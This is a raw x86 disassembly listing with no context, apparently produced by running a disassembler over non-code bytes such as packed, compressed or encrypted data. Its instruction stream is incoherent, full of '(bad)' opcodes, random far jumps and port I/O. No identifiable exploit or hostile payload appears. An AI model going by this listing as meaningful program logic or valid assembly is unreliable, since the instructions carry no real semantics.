  41251f:	mov    BYTE PTR [edx+0x7123562c],dl
  412525:	enter  0xd713,0x52
  412529:	add    al,0xcf
  41252b:	add    eax,0x9c31e8e9
  412530:	out    dx,al
  412531:	jp     0x4124d6
  412533:	jmp    0xf0ff:0x87f818b8
  41253a:	repnz adc eax,DWORD PTR [esi+0x6f323]
  412541:	neg    BYTE PTR [ebp-0x7a120036]
  412547:	rol    BYTE PTR [eax],cl
  412549:	bound  ebp,QWORD PTR [edi]
  41254b:	mov    DWORD PTR [ebx],eax
  41254d:	bound  ecx,QWORD PTR [edi]
  41254f:	mov    edi,DWORD PTR [edx]
  412551:	ret    0x86f4
  412554:	mov    dl,0xe8
  412556:	repz push es
  412558:	mov    esp,DWORD PTR [edi-0x2d]
  41255b:	push   es
  41255c:	add    cl,ch
  41255e:	pop    esi
  41255f:	push   es
  412560:	xrstor [edi-0x3416e41a]
  412567:	and    bh,dh
  412569:	shr    BYTE PTR [esi],cl
  41256b:	cwde   
  41256c:	cmp    DWORD PTR [edx+0x0],esp
	...
  41257f:	add    BYTE PTR [ebx*8-0x6c400206],cl
  412586:	xchg   cl,ch
  412588:	mov    eax,DWORD PTR [edi]
  41258a:	add    BYTE PTR [edx-0x16fbf993],dh
  412590:	repz cwde 
  412592:	pop    ss
  412593:	jb     0x412602
  412595:	push   cs
  412596:	add    al,0xe9
  412598:	repz (bad) 
  41259b:	fucomip st,st(7)
  41259d:	in     eax,dx
  41259e:	test   DWORD PTR [edx+0x7f],0x2c68f7ed
  4125a5:	and    ah,BYTE PTR [esi-0x18]
  4125a8:	repz sub eax,0x8d14fa01
  4125ae:	add    eax,0x8c5a4f62
  4125b3:	in     eax,dx
  4125b4:	push   esp
  4125b5:	ffree  st(4)
  4125b7:	call   0x9c27:0xcd53df0b
  4125be:	add    esp,DWORD PTR [eax+0x27]
  4125c1:	out    0x2b,al
  4125c3:	add    BYTE PTR [edx],dh
  4125c5:	out    dx,eax
  4125c6:	or     eax,0x58b84
  4125cb:	add    BYTE PTR [esi+ecx*4+0x609fffe],cl
  4125d2:	mov    ecx,ebp
  4125d4:	add    ah,bl
  4125d6:	xchg   DWORD PTR [ebp+esi*8-0xa],ecx
  4125da:	cmp    cl,BYTE PTR [ebp+esi*8+0x3e]
  4125de:	or     eax,0xbe387
	...
  4125f3:	add    BYTE PTR [eax],al
  4125f5:	add    BYTE PTR [edx+0x6310225e],al
  4125fb:	test   DWORD PTR [eax],0xfe20053a
  412601:	mov    bh,ch
  412603:	adc    bh,BYTE PTR es:[ebx+0x5cb]
  41260a:	in     eax,0x1e
  41260c:	cmp    DWORD PTR [esi-0x1de4b],ecx
  412612:	sahf   
  412613:	xchg   al,cl
  412615:	add    cl,cl
  412617:	add    eax,0x15b5548b
  41261c:	cmp    edx,ebx
  41261e:	stos   BYTE PTR es:[edi],al
  41261f:	sub    cl,BYTE PTR [ebx-0x195f74b3]
  412625:	sub    edi,DWORD PTR [ebp+0x558a2641]
  41262b:	push   ds
  41262c:	(bad)  
  41262d:	cmp    DWORD PTR [eax+0x48430456],ebx
  412633:	xor    al,bl
  412635:	jb     0x4125f2
  412637:	mov    eax,ds:0xa045244a
  41263c:	push   0x24
  41263e:	icebp  
  41263f:	xor    eax,ebx
  412641:	pmullw mm5,mm3
  412644:	(bad)  
  412645:	dec    DWORD PTR [ecx+0x30]
  412648:	pop    edx
  412649:	and    al,0x49
  41264b:	push   edi
  41264c:	inc    ebp
  41264d:	push   ebx
  41264e:	lock pop esi
  412650:	jge    0x41261f
  412652:	dec    eax
  412653:	mov    ebp,0x9437fe2d
  412658:	mov    bh,0x23
	...
  41266a:	add    BYTE PTR [eax],al
  41266c:	add    BYTE PTR [ebp+0x7f0823cf],dl
  412672:	aam    0x8a
  412674:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  412676:	sbb    esp,edi
  412678:	ja     0x41269f
  41267a:	sub    esi,edi
  41267c:	(bad)  [edi]
  41267e:	jge    0x4126cb
  412680:	int3   
  412681:	and    eax,DWORD PTR ds:0x180038ed
  412687:	ret    
  412688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412689:	pusha  
  41268a:	pop    ss
  41268b:	mov    bl,BYTE PTR [edx+ecx*1-0x24]
  41268f:	shr    dl,0x2c
  412692:	jge    0x412655
  412694:	mov    cl,0x46
  412696:	or     DWORD PTR [ebx],eax
  412698:	mov    dl,0x2d
  41269a:	mov    esi,0x4a24e023
  41269f:	jne    0x41268f
  4126a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126a2:	mov    dh,0x23
  4126a4:	fadd   DWORD PTR [esp+edi*4-0x1ad99c6]
  4126ab:	jmp    FWORD PTR [edi+0x4152c01b]
  4126b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126b2:	cmp    bh,ah
  4126b4:	adc    edx,DWORD PTR [ecx+ebp*1-0x219d9402]
  4126bb:	(bad)  
  4126bd:	mov    dh,0x7d
  4126bf:	inc    ebx
  4126c0:	int3   
  4126c1:	adc    eax,0x6b4fd4
  4126c6:	sbb    ecx,DWORD PTR [edi+0x7a]
  4126c9:	leave  
  4126ca:	sub    DWORD PTR [edx-0x75c70ac8],ecx
	...
  4126e0:	add    BYTE PTR [eax],al
  4126e2:	aam    0x11
  4126e4:	fdiv   QWORD PTR [edi+0x295c848b]
  4126ea:	pop    edi
  4126eb:	pop    es
  4126ec:	adc    BYTE PTR [esi+0x39],bh
  4126ef:	inc    esi
  4126f0:	(bad)  
  4126f2:	repz dec esp
  4126f4:	jmp    0xc5142137
  4126f9:	adc    eax,edx
  4126fb:	adc    dh,BYTE PTR [edx-0x31]
  4126fe:	sar    edx,cl
  412700:	outs   dx,DWORD PTR ds:[esi]
  412701:	iret   
  412702:	sar    esi,cl
  412704:	pop    edi
  412705:	(bad)  
  412706:	shl    esi,cl
  412708:	pop    ebx
  412709:	adc    BYTE PTR [edi],0xa8
  41270c:	out    0x3,eax
  41270e:	retf   
  41270f:	mov    ah,ah
  412711:	inc    DWORD PTR [edi]
  412713:	and    BYTE PTR [esi+0xc],bl
  412716:	imul   ecx,DWORD PTR [ecx+0x1ff7ffdc],0x1
  41271d:	sub    al,0x65
  41271f:	or     edx,DWORD PTR [edx]
  412721:	sub    al,0xda
  412723:	adc    al,BYTE PTR [edx]
  412725:	sub    al,0x70
  412727:	inc    edi
  412728:	call   0x924817c8
  41272d:	push   es
  41272e:	add    esp,DWORD PTR [eax]
  412730:	jno    0x41272c
  412732:	jp     0x412716
  412734:	dec    edi
  412735:	jge    0x4127ac
  412737:	out    0xe4,al
  412739:	add    esi,eax
  41273b:	add    ebp,DWORD PTR [esi-0x2314e47b]
  412741:	add    bl,BYTE PTR [esi*8+0x296b]
	...
  412758:	out    dx,al
  412759:	mov    DWORD PTR [esi],ebp
  41275b:	sub    dl,BYTE PTR [esi+0x78fc511f]
  412761:	rol    BYTE PTR [esp+ecx*1],cl
  412764:	jns    0x412728
  412766:	or     al,0x14
  412768:	imul   ecx,edx,0x4
  41276b:	loopne 0x4127d7
  41276d:	mov    edx,0xd27b140c
  412772:	add    al,0xc
  412774:	mov    eax,0xcfda93ff
  41277a:	add    esp,DWORD PTR [eax+0x54]
  41277d:	mov    esp,0x44e42d82
  412782:	psubsw mm5,QWORD PTR [ebx+ebp*1+0x37]
  412787:	push   0xffffff88
  412789:	jecxz  0x4127ce
  41278b:	jmp    0x7d31b3b1
  412790:	sub    dl,ah
  412792:	mov    edi,0x37436c9f
  412797:	sub    ebp,esp
  412799:	push   es
  41279a:	mov    esp,DWORD PTR [ebp-0x567b20c9]
  4127a0:	pop    esi
  4127a1:	or     eax,0xc1d8b183
  4127a6:	sub    BYTE PTR [ebp-0x16e8baf5],0x74
  4127ad:	retf   
  4127ae:	and    ebp,DWORD PTR ds:0xcf734f6f
  4127b4:	fs mov edx,0x385f2523
  4127ba:	jae    0x412783
	...
  4127cc:	add    BYTE PTR [eax],al
  4127ce:	pop    edx
  4127cf:	test   BYTE PTR [ebx],dl
  4127d1:	in     eax,dx
  4127d2:	repz push es
  4127d4:	dec    eax
  4127d5:	jo     0x412848
  4127d7:	inc    BYTE PTR [ebx]
  4127d9:	jmp    0xf9ceb7d1
  4127de:	mov    bh,0x1e
  4127e0:	inc    BYTE PTR [ecx+0x9]
  4127e3:	and    ebp,ebp
  4127e5:	push   edx
  4127e6:	pushf  
  4127e7:	dec    edi
  4127e8:	push   esi
  4127e9:	out    0x21,al
  4127eb:	pop    edi
  4127ec:	(bad)  
  4127ed:	fdiv   DWORD PTR [edx-0x7bd630e2]
  4127f3:	inc    ebp
  4127f4:	push   cs
  4127f5:	xchg   edi,eax
  4127f6:	sbb    al,BYTE PTR [edi]
  4127f8:	adc    BYTE PTR [eax+0x1abf37f3],ch
  4127fe:	xor    DWORD PTR ds:0x47000b6,ecx
  412804:	adc    BYTE PTR [ecx+0x59],al
  412807:	mov    ecx,0x1f0e33be
  41280c:	mov    ah,0xb9
  41280e:	dec    edx
  41280f:	cli    
  412810:	inc    eax
  412811:	add    BYTE PTR [eax],cl
  412813:	retf   0xc181
  412816:	dec    ebp
  412817:	adc    eax,ebp
  412819:	and    eax,0x49000109
  41281f:	push   esp
  412820:	mov    DWORD PTR [ebp-0x447ce127],0x53000a20
  41282a:	nop
  41282b:	test   DWORD PTR [esi+ecx*2+0x18c0890d],0x0
	...
  412842:	add    BYTE PTR [eax],al
  412844:	jns    0x41284e
  412846:	add    BYTE PTR [edi+0x319],bh
  41284c:	xchg   esp,eax
  41284d:	dec    edx
  41284e:	call   DWORD PTR [eax+edx*4-0xd]
  412852:	xor    al,al
  412854:	fmul   QWORD PTR [ecx]
  412856:	add    BYTE PTR [eax],al
  412858:	fldenv [eax+0x80dc727]
  41285e:	add    BYTE PTR [eax],al
  412860:	leave  
  412861:	or     DWORD PTR [eax],eax
  412863:	sbb    DWORD PTR [ecx-0x32ffc2fa],0x9
  41286a:	add    BYTE PTR [edx+0x75],dh
  41286d:	add    eax,0x0
  412870:	int    0x9
  412872:	add    BYTE PTR [ebx-0x4d4f9a8],al
  412878:	pushf  
  412879:	retf   
  41287a:	mov    DWORD PTR [esi-0x1e243],ecx
  412880:	adc    cl,BYTE PTR ds:0x9c16c883
  412886:	test   BYTE PTR [ecx*4-0xf76fff7],ah
  41288d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41288e:	sti    
  41288f:	add    esi,eax
  412891:	das    
  412892:	jnp    0x412831
  412894:	hlt    
  412895:	sub    eax,DWORD PTR [edx]
  412897:	add    BYTE PTR [ecx-0x63],bh
  41289a:	test   DWORD PTR [ebx],0x397b2ff0
  4128a0:	imul   edi,DWORD PTR [ebp+0x2ff0040f],0x79
  4128a7:	xchg   ebp,eax
	...
  4128b8:	add    BYTE PTR [eax],al
  4128ba:	loopne 0x4128df
  4128bc:	add    al,BYTE PTR [eax]
  4128be:	imul   esi,DWORD PTR [ebp+0x2ff003db],0x6b790878
  4128c8:	ficomp WORD PTR [ebx]
  4128ca:	jnp    0x41292f
  4128cc:	ficom  WORD PTR [ebx+0x68]
  4128cf:	sub    DWORD PTR [ebx],eax
  4128d1:	sahf   
  4128d2:	cld    
  4128d3:	and    eax,DWORD PTR [edx]
  4128d5:	add    cl,dh
  4128d7:	test   DWORD PTR [edx],edx
  4128d9:	add    al,0xf0
  4128db:	das    
  4128dc:	mov    edx,0x140b7c88
  4128e1:	mov    DWORD PTR [ebx+eax*1+0xc],esi
  4128e5:	mov    DWORD PTR [esi-0x180001de],ecx
  4128eb:	xchg   edi,eax
  4128ec:	(bad)  
  4128ed:	and    edi,DWORD PTR [eax]
  4128ef:	sbb    DWORD PTR [ecx+0xe],eax
  4128f2:	outs   dx,BYTE PTR ds:[esi]
  4128f3:	popa   
  4128f4:	std    
  4128f5:	dec    edi
  4128f7:	xchg   ebx,eax
  4128f8:	mov    edi,edi
  4128fa:	(bad)  
  4128fb:	add    cl,BYTE PTR cs:[ebx-0x7b39b5cc]
  412902:	mov    al,0xf2
  412904:	jmp    0xa8b6593
  412909:	inc    ecx
  41290a:	jns    0x4128f6
  41290c:	fist   WORD PTR [edi]
  41290e:	je     0x412977
  412910:	scas   eax,DWORD PTR es:[edi]
  412911:	sub    al,0x6b
  412913:	repnz fistp WORD PTR [edi+0x7b]
  412917:	pop    es
  412918:	ja     0x41292d
  41291a:	in     al,dx
  41291b:	push   es
  41291c:	jmp    0x4129fb
	...
  41292d:	add    BYTE PTR [eax],al
  41292f:	add    BYTE PTR [ebx],ch
  412931:	jecxz  0x4128eb
  412933:	shr    DWORD PTR [edx+0x75],1
  412936:	hlt    
  412937:	jmp    FWORD PTR [edi+0x1c]
  41293a:	adc    eax,edx
  41293c:	adc    esi,DWORD PTR [edi-0x1d548569]
  412942:	xchg   esp,eax
  412943:	rol    eax,1
  412945:	sbb    ebx,DWORD PTR [eax]
  412947:	xor    BYTE PTR [ebx],0xf7
  41294a:	imul   eax,DWORD PTR [ebx-0xa],0xffffff82
  41294e:	xchg   ebx,eax
  41294f:	(bad)  
  412950:	aas    
  412951:	sbb    al,0xd1
  412953:	(bad)  
  412954:	adc    edi,ebx
  412956:	xchg   ebx,eax
  412957:	adc    DWORD PTR [ebx-0x55],edi
  41295a:	int3   
  41295b:	mov    edi,0xc3c4b37a
  412960:	push   0x68d7ccab
  412965:	mov    bl,0xc4
  412967:	fistp  DWORD PTR [edx]
  412969:	cld    
  41296a:	jno    0x41292c
  41296c:	shl    DWORD PTR [edx+0x2e37671],cl
  412972:	jmp    0x3888f47a
  412977:	rol    DWORD PTR [eax-0x76],1
  41297a:	sbb    al,0xe0
  41297c:	and    edi,DWORD PTR [ecx-0x7828c98f]
  412982:	mov    cl,0x25
  412984:	(bad)  
  412985:	(bad)  
  412986:	cmp    al,0xe0
  412988:	sbb    ecx,DWORD PTR [eax-0x7508fd5d]
  41298e:	inc    esi
  41298f:	(bad)  
  412990:	mov    edi,0x7e611b
	...
  4129a5:	add    BYTE PTR [ebx],dl
  4129a7:	add    ebp,ecx
  4129a9:	add    esi,DWORD PTR [edi-0xff0333e]
  4129af:	push   es
  4129b0:	jmp    0x402b8
  4129b5:	int3   
  4129b6:	mov    ebx,0xd56a6192
  4129bb:	push   es
  4129bc:	movq   mm4,QWORD PTR [edx-0x7516fff8]
  4129c3:	(bad)  
  4129c4:	and    edx,DWORD PTR [ecx]
  4129c6:	jge    0x41294f
  4129c8:	inc    edi
  4129c9:	jmp    0xb47:0xad8b06f3
  4129d0:	push   edi
  4129d1:	adc    dh,BYTE PTR [ebp+0x1e624fb8]
  4129d7:	and    al,0xe1
  4129d9:	xor    eax,0xb58a1d15
  4129de:	daa    
  4129df:	rcl    DWORD PTR [esi-0x48],cl
  4129e2:	mov    eax,0xd4318a49
  4129e7:	push   edi
  4129e8:	test   BYTE PTR [esi],0xd5
  4129eb:	loopne 0x4129af
  4129ed:	neg    BYTE PTR [esi-0xc16fd06]
  4129f3:	pop    DWORD PTR [ebx-0x33]
  4129f6:	or     ebx,edx
  4129f8:	jmp    ebx
  4129fa:	repz push es
  4129fc:	jl     0x4129ee
  4129fe:	jo     0x412a1c
  412a00:	add    esi,ebp
  412a02:	jg     0x412a12
  412a04:	add    ebp,ecx
  412a06:	repz fcos 
  412a09:	dec    ebx
	...
  412a1a:	add    BYTE PTR [eax],al
  412a1c:	hlt    
  412a1d:	push   es
  412a1e:	jl     0x412a10
  412a20:	jo     0x412a3b
  412a22:	add    ch,dh
  412a24:	pop    edi
  412a25:	pop    ds
  412a26:	add    ecx,ebp
  412a28:	repz lea ebx,[ebx+0x5]
  412a2c:	mov    esp,0xb7cd438d
  412a31:	lea    edx,[ebp-0x1e5400b]
  412a37:	ret    0x8f30
  412a3a:	inc    ebx
  412a3b:	lds    edx,FWORD PTR [ebx+0x1c004fc2]
  412a41:	pop    edi
  412a42:	call   DWORD PTR [eax-0x35]
  412a45:	xor    al,0x8b
  412a47:	inc    esp
  412a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a49:	push   edx
  412a4a:	dec    esi
  412a4b:	mov    ebp,DWORD PTR [edi-0x2]
  412a4e:	(bad)  
  412a50:	push   cs
  412a51:	jecxz  0x4129dc
  412a53:	dec    esp
  412a54:	cmc    
  412a55:	cmp    dh,BYTE PTR [edi]
  412a57:	dec    esp
  412a58:	in     eax,0x42
  412a5a:	mov    eax,DWORD PTR [ebx+0x58]
  412a5d:	popf   
  412a5e:	inc    edx
  412a5f:	and    al,0x4d
  412a61:	dec    ecx
  412a62:	jp     0x412a9d
  412a64:	loop   0x412a1a
  412a66:	push   eax
  412a67:	mov    ecx,DWORD PTR [edi]
  412a69:	inc    BYTE PTR [edx-0x9]
  412a6c:	push   ds
  412a6d:	jecxz  0x4129f8
  412a6f:	dec    esp
  412a70:	xor    eax,0x35448746
  412a75:	cmp    cl,BYTE PTR [ecx+0x4e5a2544]
  412a7b:	push   ecx
  412a7c:	xchg   edx,eax
  412a7d:	shl    esi,cl
  412a7f:	das    
	...
  412a90:	add    BYTE PTR [eax],al
  412a92:	es out 0xfd,al
  412a95:	mov    ecx,DWORD PTR [ebp+0x3a]
  412a98:	and    ch,BYTE PTR [ebx]
  412a9a:	rol    DWORD PTR [esi],1
  412a9c:	leave  
  412a9d:	mov    eax,0x38e19440
  412aa2:	es in  al,dx
  412aa4:	iret   
  412aa5:	cli    
  412aa6:	add    al,0xbf
  412aa9:	call   0xec032bac
  412aae:	or     DWORD PTR [edx+0x53fd244a],ecx
  412ab4:	mov    esi,ecx
  412ab6:	ror    DWORD PTR [ebx],0xf7
  412ab9:	call   FWORD PTR [esi+0x15245289]
  412abf:	mov    dl,dh
  412ac1:	mov    edx,DWORD PTR ds:0xf9523e2f
  412ac7:	mov    esp,ecx
  412ac9:	call   0xfe5aa4be
  412ace:	scas   eax,DWORD PTR es:[edi]
  412acf:	inc    esp
  412ad0:	cmp    cl,BYTE PTR [edx+0x23bf94b3]
  412ad6:	cmp    BYTE PTR [edi+0x2cf3e186],ah
  412adc:	inc    esp
  412add:	ror    BYTE PTR [eax-0x33bbfad3],0x6b
  412ae4:	fucom  st(7)
  412ae6:	std    
  412ae7:	pop    ss
  412ae8:	dec    ecx
  412ae9:	inc    ebx
  412aea:	int3   
  412aeb:	sbb    eax,DWORD PTR [ebx]
  412aed:	add    al,dh
  412aef:	das    
  412af0:	xchg   esi,edi
  412af2:	fiadd  WORD PTR [edi]
  412af4:	(bad)  [ebx+0x0]
	...
  412b07:	add    BYTE PTR [esp+eiz*2],dl
  412b0a:	sahf   
  412b0b:	das    
  412b0c:	imul   esp,DWORD PTR [ebx-0x1a],0x27
  412b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b11:	jle    0x412aa0
  412b13:	int    0x58
  412b15:	mov    eax,ds:0x943ffe19
  412b1a:	mov    bh,0x23
  412b1c:	lods   al,BYTE PTR ds:[esi]
  412b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b1e:	cmp    ecx,DWORD PTR [edx+0x51c243b4]
  412b24:	rcl    BYTE PTR [ecx+edx*2+0x21114be7],0xfe
  412b2c:	fucomi st,st(4)
  412b2e:	mov    ds,WORD PTR [ebx-0x2c]
  412b31:	ja     0x412ad2
  412b33:	pop    es
  412b34:	das    
  412b35:	jmp    0x412b1e
  412b37:	adc    esi,ecx
  412b39:	das    
  412b3a:	add    al,BYTE PTR [eax]
  412b3c:	ins    DWORD PTR es:[edi],dx
  412b3d:	xor    BYTE PTR [edi-0x1825d6b4],dl
  412b43:	inc    ebx
  412b44:	gs jmp 0x2245b8d8
  412b4a:	add    al,BYTE PTR [eax]
  412b4c:	dec    edx
  412b4d:	das    
  412b4e:	mov    ch,0x50
  412b50:	jnp    0x412bca
  412b52:	sub    bl,BYTE PTR [esi+0x22a607c3]
  412b58:	push   0xffffffb3
  412b5a:	(bad)  
  412b5b:	(bad)  
  412b5c:	push   0x3f
  412b5e:	popa   
  412b5f:	(bad)  
  412b60:	rol    esi,cl
  412b62:	cmp    dh,BYTE PTR [edx+edi*2-0x5a4f6fb7]
  412b69:	sbb    BYTE PTR [ebp-0x72],bh
	...
  412b7c:	add    BYTE PTR [eax],al
  412b7e:	sub    esp,ebx
  412b80:	sar    BYTE PTR [eax-0x6f6173e0],0x2b
  412b87:	jmp    edi
  412b89:	sub    ebx,DWORD PTR [ebx]
  412b8b:	adc    DWORD PTR [ebp+0x22],ebx
  412b8e:	mov    edx,0x13bf613e
  412b93:	mov    edi,0xc32f0dce
  412b98:	or     al,0xf8
  412b9a:	pop    edi
  412b9b:	sbb    al,ch
  412b9d:	add    ecx,DWORD PTR [ebx+0xc]
  412ba0:	push   0xffffff9f
  412ba2:	adc    esi,ebx
  412ba4:	call   0xe98a98bb
  412ba9:	add    esi,eax
  412bab:	sbb    DWORD PTR [ebx],0x5
  412bae:	out    0x88,eax
  412bb0:	inc    ecx
  412bb1:	add    al,0xf0
  412bb3:	push   es
  412bb4:	bound  esi,QWORD PTR [edi-0x768e192d]
  412bba:	add    eax,DWORD PTR [ebx]
  412bbc:	jmp    0xf6869ec4
  412bc1:	mov    ah,0x72
  412bc3:	inc    esp
  412bc4:	jmp    0x6cb3:0xea4772b6
  412bcb:	retf   
  412bcc:	add    al,0xe0
  412bce:	mov    al,ds:0x7f2ca68b
  412bd3:	sbb    eax,0xc27a21cd
  412bd8:	or     al,0xd4
  412bda:	sbb    al,bl
  412bdc:	add    al,0xec
  412bde:	push   0xffffffb2
  412be0:	dec    DWORD PTR [eax+eax*1]
	...
  412bf3:	add    BYTE PTR [eax+0x7c9f8ab5],ch
  412bf9:	fwait
  412bfa:	and    dl,BYTE PTR [ecx-0x6101ed21]
  412c00:	gs das 
  412c02:	mov    ch,BYTE PTR ds:0x3954df98
  412c08:	jne    0x412c53
  412c0a:	out    0x97,eax
  412c0c:	pop    es
  412c0d:	sbb    esi,edi
  412c0f:	shr    BYTE PTR [edi+edi*2],cl
  412c12:	or     BYTE PTR [ebx+0x62c203f5],0x34
  412c19:	inc    edi
  412c1a:	clc    
  412c1b:	jmp    0x412be9
  412c1d:	in     eax,dx
  412c1e:	out    0x43,eax
  412c20:	fistp  WORD PTR [eax]
  412c22:	(bad)  
  412c23:	bound  ebp,QWORD PTR [ecx*4-0x4dabfabd]
  412c2a:	dec    edi
  412c2b:	jb     0x412bef
  412c2d:	pop    ds
  412c2e:	retf   0x1134
  412c31:	sbb    DWORD PTR [edx+0x24c5d21],ecx
  412c37:	and    BYTE PTR [esi+ebp*1+0x104272a1],ah
  412c3e:	call   0xc9ce027b
  412c43:	sub    bl,bl
  412c45:	clc    
  412c46:	add    ah,BYTE PTR [ebx]
  412c48:	jne    0x412c0d
  412c4a:	and    edi,DWORD PTR [ebp+0x103a4ef4]
  412c50:	ja     0x412c51
  412c52:	(bad)  
  412c53:	lods   eax,DWORD PTR ds:[esi]
  412c54:	pop    ss
  412c55:	repz add cl,ch
	...
  412c68:	add    BYTE PTR [eax],al
  412c6a:	repz push es
  412c6c:	test   esi,esp
  412c6e:	pop    ecx
  412c6f:	fistp  QWORD PTR [edx]
  412c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c72:	push   edi
  412c73:	jecxz  0x412bff
  412c75:	cmp    eax,0x3b4fe6d8
  412c7a:	jne    0x412cc0
  412c7c:	out    0x0,eax
  412c7e:	addr16 std 
  412c80:	std    
  412c81:	jmp    DWORD PTR [edx-0x2e]
  412c84:	mov    DWORD PTR [ebp+edi*8+0x22],eax
  412c88:	push   ebx
  412c89:	push   eax
  412c8a:	push   edx
  412c8b:	mov    eax,0xe75c7fe6
  412c90:	std    
  412c91:	cmp    esi,DWORD PTR [ecx-0x65fd7409]
  412c97:	or     al,BYTE PTR [eax]
  412c99:	xor    ebp,0x1e
  412c9c:	adc    al,BYTE PTR [eax]
  412c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c9f:	(bad)  
  412ca0:	cmc    
  412ca1:	add    cl,BYTE PTR [ecx-0x65027cf6]
  412ca7:	test   DWORD PTR [ebp+0xa99d4],0x1e2e458b
  412cb1:	mov    edi,DWORD PTR ds:0xdf8b562e
  412cb7:	sbb    eax,0x8b590002
  412cbc:	mov    edi,0xc08b78fd
  412cc1:	add    edi,DWORD PTR [ebx-0x75]
  412cc4:	mov    esi,0x4a856903
  412cc9:	and    al,0x55
  412ccb:	pop    ecx
  412ccc:	mov    esi,ecx
	...
  412cde:	add    BYTE PTR [eax],al
  412ce0:	loope  0x412c92
  412ce2:	idiv   bh
  412ce4:	(bad)  
  412ce5:	add    BYTE PTR [edx+0x24],0x49
  412ce9:	adc    DWORD PTR [edx+0x24],0x3d
  412ced:	sbb    DWORD PTR [edx+0x24],0x41
  412cf1:	xor    eax,ecx
  412cf3:	push   edx
  412cf4:	mov    ds:0x3c7c4eb7,al
  412cf9:	loop   0x412d1d
  412cfb:	cmc    
  412cfc:	push   ss
  412cfd:	not    BYTE PTR [ebx+0x53]
  412d00:	add    ah,0x87
  412d03:	inc    esp
  412d04:	in     eax,dx
  412d05:	push   ss
  412d06:	out    0x17,al
  412d08:	lock xor bl,BYTE PTR [esi]
  412d0b:	(bad)  
  412d0c:	jnp    0x412d01
  412d0e:	out    0x23,eax
  412d10:	or     ebx,DWORD PTR [edi+0x7c]
  412d13:	adc    dl,0x20
  412d16:	add    edx,eax
  412d18:	jnp    0x412d81
  412d1a:	inc    esp
  412d1b:	clc    
  412d1c:	repnz dec eax
  412d1e:	out    dx,eax
  412d1f:	out    0xbf,eax
  412d21:	jae    0x412d41
  412d23:	(bad)  
  412d24:	sbb    eax,0x79cd8ad1
  412d29:	jecxz  0x412d12
  412d2b:	sub    ebx,DWORD PTR [eax-0x6001e88f]
  412d31:	cwde   
  412d32:	dec    ebx
  412d33:	mov    ch,BYTE PTR [esp+ecx*2]
  412d36:	out    0x2a,al
  412d38:	mov    eax,0x99b74b20
  412d3d:	ror    DWORD PTR [edx+0x34b6872d],0xf9
	...
  412d54:	add    BYTE PTR [eax],al
  412d56:	imul   ebx,ecx,0x44
  412d59:	call   0x8a894e6d
  412d5e:	lods   al,BYTE PTR ds:[esi]
  412d5f:	or     ebx,eax
  412d61:	add    ch,BYTE PTR [eax]
  412d63:	or     BYTE PTR ds:0xc7ece87c,ch
  412d69:	and    esp,esp
  412d6b:	push   ds
  412d6c:	add    al,BYTE PTR [eax]
  412d6e:	lock stos BYTE PTR es:[edi],al
  412d70:	push   ds
  412d71:	jne    0x412d7b
  412d73:	sub    DWORD PTR [edi+0x7b],eax
  412d76:	or     al,0x99
  412d78:	mov    bh,0x23
  412d7a:	loopne 0x412dcb
  412d7c:	mov    al,0x8a
  412d7e:	ss pop es
  412d80:	push   ebp
  412d81:	repz pop ds
  412d83:	or     al,0x8b
  412d85:	xlat   BYTE PTR ds:[ebx]
  412d86:	imul   ebp,DWORD PTR [ebx-0x1a],0x27
  412d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d8b:	outs   dx,DWORD PTR ds:[esi]
  412d8c:	mov    ebp,ecx
  412d8e:	sbb    cl,al
  412d90:	pop    ss
  412d91:	(bad)  
  412d92:	inc    DWORD PTR ds:0x82e63c22
  412d98:	add    eax,DWORD PTR [edx]
  412d9a:	lock push es
  412d9c:	push   0xffffff9f
  412d9e:	adc    edi,ebx
  412da0:	call   0xeb32a2b3
  412da5:	add    esi,eax
  412da7:	jg     0x412dc5
  412da9:	call   0xef6b7d5
  412dae:	ins    BYTE PTR es:[edi],dx
  412daf:	mov    al,ds:0x87f003e7
  412db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db5:	add    al,0xe7
  412db7:	mov    WORD PTR [eax],?
  412db9:	add    eax,0x0
	...
  412dca:	add    BYTE PTR [eax],al
  412dcc:	lock push es
  412dce:	bound  esi,QWORD PTR [edi+0x4e61bad3]
  412dd4:	retf   0x733f
  412dd7:	pop    es
  412dd8:	jmp    0xad7f:0xf195a5cf
  412ddf:	mov    bl,0x7a
  412de1:	retf   
  412de2:	(bad)  
  412de3:	test   edx,0x64b3b933
  412de9:	ret    
  412dea:	add    al,0xe0
  412dec:	sar    BYTE PTR [edi+0x26],0x8c
  412df0:	retf   
  412df1:	jmp    0x1e45:0x1c2b2c04
  412df8:	sbb    BYTE PTR [ebx-0x253e27fc],dl
  412dfe:	popa   
  412dff:	mov    bh,0x13
  412e01:	xlat   BYTE PTR ds:[ebx]
  412e02:	xchg   ebp,eax
  412e03:	mov    cl,0x6a
  412e05:	inc    ebp
  412e06:	adc    al,ah
  412e08:	inc    ebx
  412e09:	adc    al,0x1d
  412e0b:	mov    al,BYTE PTR [edi-0x80]
  412e0e:	lods   al,BYTE PTR ds:[esi]
  412e0f:	out    0xdf,eax
  412e11:	mov    ebx,0x1f2d8ab8
  412e16:	(bad)  
  412e17:	pop    ss
  412e18:	push   ss
  412e19:	adc    al,0xc1
  412e1b:	inc    edx
  412e1c:	jp     0x412dd1
  412e1e:	dec    esp
  412e20:	call   DWORD PTR [ecx-0x17d09df1]
  412e26:	das    
  412e27:	jb     0x412e61
  412e29:	call   0xe8019e61
  412e2e:	aaa    
  412e2f:	pusha  
	...
  412e40:	add    BYTE PTR [eax],al
  412e42:	test   al,0xe7
  412e44:	cmp    esp,DWORD PTR [edx-0x58]
  412e47:	out    0xf,eax
  412e49:	push   ds
  412e4a:	mov    eax,ds:0x1caf8ac3
  412e4f:	in     eax,dx
  412e50:	lock mov dh,0xe5
  412e53:	or     BYTE PTR [ebx+0x5],0x9c
  412e57:	mov    esp,0x81267250
  412e5c:	xlat   BYTE PTR ds:[ebx]
